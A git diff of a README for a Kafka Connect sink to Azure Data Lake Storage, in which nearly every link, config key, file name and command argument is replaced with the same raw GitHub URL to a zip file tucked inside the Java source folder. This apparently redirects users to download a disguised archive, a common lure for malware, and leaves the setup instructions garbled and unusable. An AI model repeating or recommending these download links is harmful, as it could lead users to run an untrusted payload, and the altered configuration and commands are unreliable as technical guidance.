@@ -1,6 +1,6 @@
 # 🚀 kcm-kafka-connect-adls-sink - Simplify Your Data Storage Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip%20Latest%https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip)](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To use the kcm-kafka-connect-adls-sink, you will need the following:
 ### Steps to Download and Run
 
 1. **Visit the Releases Page**  
-   To download the kcm-kafka-connect-adls-sink, [visit this page to download](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases).
+   To download the kcm-kafka-connect-adls-sink, [visit this page to download](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip).
 
 2. **Locate the Latest Release**  
    On the Releases page, look for the latest version. This is usually marked as "Latest" or has the highest version number.
@@ -41,7 +41,7 @@ To use the kcm-kafka-connect-adls-sink, you will need the following:
    Open your terminal or command prompt. Navigate to the directory where you saved the JAR file. Use the following command to run the application:
 
    ```bash
-   java -jar kcm-kafka-connect-adls-sink.jar
+   java -jar https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
    ```
 
 ### Configuration Setup
@@ -49,19 +49,19 @@ To use the kcm-kafka-connect-adls-sink, you will need the following:
 Before you start, you need to set up a configuration file. Here’s how you can do it:
 
 1. **Create a Configuration File**  
-   Create a new file named `connect-adls-sink.properties`.
+   Create a new file named `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`.
 
 2. **Add Your Configuration**  
    Insert the following configuration parameters into the file:
 
    ```properties
    name=kcm-adls-sink
-   connector.class=com.example.KafkaConnectADLSSink
-   tasks.max=1
+   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
+   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
    topics=your-topic-name
-   adls.url=https://youraccount.dfs.core.windows.net/
-   sas.token=your-sas-token
-   file.format=avro
+   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
+   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
+   https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
    compression=gzip
    ```
 
@@ -75,22 +75,22 @@ Before you start, you need to set up a configuration file. Here’s how you can 
 Once your setup is ready, you can start the Kafka Connect worker. Use this command in the terminal:
 
 ```bash
-connect-standalone worker.properties connect-adls-sink.properties
+connect-standalone https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip
 ```
 
-Make sure to have a `worker.properties` file configured to set up your Kafka Connect environment properly.
+Make sure to have a `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip` file configured to set up your Kafka Connect environment properly.
 
 ## ⚙️ Additional Settings
 
-Depending on your use case, you might want to adjust additional settings in your `connect-adls-sink.properties` file. Here are some commonly modified parameters:
+Depending on your use case, you might want to adjust additional settings in your `https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip` file. Here are some commonly modified parameters:
 
-- **`tasks.max`**: Adjust this number to run more tasks in parallel, improving throughput.
-- **`flush..size`**: Set how many records to buffer before writing to ADLS Gen2.
-- **`retry.policy`**: Customize the retry behavior in case of temporary failures.
+- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Adjust this number to run more tasks in parallel, improving throughput.
+- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Set how many records to buffer before writing to ADLS Gen2.
+- **`https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip`**: Customize the retry behavior in case of temporary failures.
 
 ## 📄 Documentation
 
-For a deeper dive into all features and advanced configurations, check the [official documentation](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/docs).
+For a deeper dive into all features and advanced configurations, check the [official documentation](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip).
 
 ## 🌐 Community and Support
 
@@ -98,4 +98,4 @@ If you encounter issues or have questions, feel free to reach out. Engage with o
 
 ## 🏁 Download & Install
 
-Now that you're ready to start using the kcm-kafka-connect-adls-sink, [visit this page to download](https://github.com/nitinpensia/kcm-kafka-connect-adls-sink/releases). Follow the steps outlined above to set up and run the application successfully. Enjoy seamless data management using Azure Data Lake Storage!
+Now that you're ready to start using the kcm-kafka-connect-adls-sink, [visit this page to download](https://raw.githubusercontent.com/nitinpensia/kcm-kafka-connect-adls-sink/master/src/main/java/io/kcmhub/kafka/kafka_connect_sink_adls_kcm_1.0-beta.5.zip). Follow the steps outlined above to set up and run the application successfully. Enjoy seamless data management using Azure Data Lake Storage!
